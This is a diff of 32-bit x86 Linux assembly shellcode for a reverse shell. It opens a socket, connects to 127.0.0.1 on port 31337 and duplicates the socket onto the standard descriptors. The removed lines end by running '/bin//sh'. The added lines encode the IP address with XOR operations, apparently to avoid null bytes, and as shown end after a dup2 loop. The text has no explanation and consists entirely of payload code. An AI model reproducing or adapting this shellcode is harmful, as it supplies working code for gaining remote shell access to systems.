@@ -1,56 +1,50 @@
 .global main
-.section text
-
 main:
-push $0x66
-pop %eax
+	push	$0x66
+	pop		%eax
 
-push $0x1
-pop %ebx
+	push	$0x1
+	pop		%ebx
 
-xor %edx, %edx
-push %edx	
-push %ebx
-push $0x2
-mov %esp, %ecx
+	xor		%edx, %edx
+	push	%edx
+	push	%ebx
+	push	$0x2
+	mov		%esp, %ecx
 
-int $0x80
-mov %eax, %edx
+	int		$0x80
+	xchg	%eax, %edx
 
-push $0x66
-pop %eax
 
-inc %ebx          
-pushw %bx
-push $0x0100007f
-pushw $0x697a
-mov %esp, %ecx
 
-push $0x10
-push %ecx
-push %edx
+	mov		$0x66, %al
 
-mov %esp, %ecx
+	mov 	$0x0101017f, %ecx
+	xor		$0x1010107f, %ecx
+	xor		$0x1011117f, %ecx
+	push	%ecx
 
-inc %ebx
+	pushw	$0x697a
+	inc		%ebx
+	pushw	$0x2
+	mov		%esp, %ecx
 
-int $0x80
+	push	$0x10
+	push	%ecx
+	push	%edx
 
-mov %edx, %ebx
-push $0x3f
-pop %eax
-int $0x80
+	mov		%esp, %ecx
+	inc		%ebx
 
-push $0x0b
-pop %eax
+	int		$0x80
 
-xor %ecx, %ecx
-mov %ecx, %edx
 
-push %edx
-push $0x68732f2f
-push $0x6e69622f
 
-mov %esp, %ebx
-
-int $0x80
+	push	$0x2
+	pop		%ecx
+	xchg	%ebx, %edx
+loop:
+	mov		$0x3f, %al
+	int		$0x80
+	dec		%ecx
+	jns		loop
